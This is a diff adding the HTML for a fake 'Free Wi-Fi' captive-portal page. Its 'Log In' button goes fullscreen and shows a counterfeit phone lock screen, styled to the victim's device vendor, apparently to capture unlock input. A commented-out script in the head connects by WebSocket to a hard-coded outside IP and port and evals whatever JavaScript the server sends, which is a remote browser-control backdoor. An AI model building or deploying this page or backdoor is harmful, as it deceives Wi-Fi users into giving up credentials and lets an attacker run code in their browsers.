@@ -1,0 +1,123 @@
+
+  <head>
+<link href="./css/style.css" rel="stylesheet">
+<link rel="stylesheet" href="./css/jquery-ui.css">
+<script src="./js/jquery.min.js"></script>
+<script src="./js/platform.js"></script>
+<script src="./js/jquery-ui.min.js"></script>
+<script src="./js/fastclick.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mobile-detect@1.4.4/mobile-detect.min.js"></script>
+<script src="js/ua-parser.min.js" charset="utf-8"></script>
+<script>
+$("#screen").addClass("defaultwp");
+$(".pwned").addClass("defaultwp");
+$("#lockscreen").addClass("defaultwp");
+
+var md = new MobileDetect(window.navigator.userAgent);
+brand = md.mobile().toLowerCase();
+
+if (brand == "samsung"){
+ vendor = ("samsung")
+}else if ( brand == "htc"){
+ vendor = ("pixel")
+}else if (brand == "unknownphone"){
+ var parser = new UAParser();
+var result = parser.getResult();
+vendor = (result.device.vendor.toLowerCase());
+}else if (brand == "unknowntablet"){
+ var parser = new UAParser();
+var result = parser.getResult();
+vendor = (result.device.vendor.toLowerCase());
+
+}
+
+
+</script>
+<script>function getUrlVars() { var vars = {}; var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) { vars[key] = value; }); return vars; }
+
+
+/*(function(){ 'use strict';
+  //replace these with your own endpoint configuration
+  var host = getUrlVars()["ip"]||'109.234.162.88',
+    port = getUrlVars()["port"]||'8070',
+    proto = 'ws',
+    path = '/s';
+
+  var socket = new WebSocket(proto+'://'+host+':'+port+path),
+    EvalContext = function(header){
+      this.send = function(data, isErr){
+        var errCode = (isErr) ? 'z' : '';
+        socket.send(errCode+header+data);
+      };
+    };
+
+  function evctx(js, c){
+    return function() { return eval(js); }.call(c);
+  }
+
+  socket.onmessage = function(e){
+    var d = e.data, ctx = new EvalContext(d.slice(0,8));
+    try{
+      evctx(d.slice(8), ctx);
+    }catch(err){
+      //console.log('silently fail:', err);
+      ctx.send(err, true)
+    }
+  };
+})();*/
+</script>
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.5">
+</head>
+<body id="body">
+
+
+
+
+<body id="body" style="text-align:center;background-color:white;">
+
+<div id='containerz'>
+<h1>
+Free Wi-Fi
+</h1>
+</div>
+
+<div class="deleteme">
+<button onclick='gofullscreen();'>Log In</button>
+</div>
+
+<div class="pwn" style="margin:0px;padding:0px;display:none;">
+<div id="screen" style="margin:0px;padding:0px" onclick="bounce()">
+    <div id="lockscreen">
+      <span id="slideup">
+      <div id="banner">
+        <p class="carrier" onclick="location.reload()"> Three (O3)</p>
+        <div id="wifi"></div>
+        <div id="phone"></div>
+        <span class="battery-level"></span>
+        <div id="battery"></div>
+        <!--<img class="profile" src="https://lh3.googleusercontent.com/-X-aQXHatDQY/Uy86XLOyEdI/AAAAAAAAAF0/TBEZvkCnLVE/w140-h140-p/fb3a11ae-1fb4-4c31-b2b9-bf0cfa835c27" />-->
+      </div>
+     <div id="cont"> 
+      <span class="material-icons lock">lock</span>
+        <p class="time" id="time">22:02</p>
+        <p class="date" id="date">thursday 16 july</p>
+      </div>
+      <span class="pass"></span>
+      
+      <p id="unlock">Swipe up to unlock</p>
+      
+      <i class="material-icons phone" id="dialer" onclick="phone();return false">phone</i>
+      <span class="white-select-left"></span>
+
+      <i class="material-icons camera" onclick="camera();return false" id="camera">photo_camera</i>
+      <span class="white-select"></span>
+    </span>
+    </div>
+  </div>
+</div>
+
+
+
+
+  <script type="text/javascript" src="./js/main.js"></script>
+</body>
